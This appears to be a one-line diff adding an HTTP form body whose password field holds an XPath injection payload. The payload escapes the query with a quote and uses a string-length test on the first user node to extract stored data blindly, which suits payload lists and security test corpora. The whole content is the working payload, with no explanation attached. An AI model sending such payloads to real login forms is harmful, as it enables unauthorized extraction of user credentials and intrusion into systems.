@@ -1,0 +1,1 @@
+username=John&password=abc%27+or+string-length(//user[position()=1]/child::node()[position()=1])=4+or+'1'='1
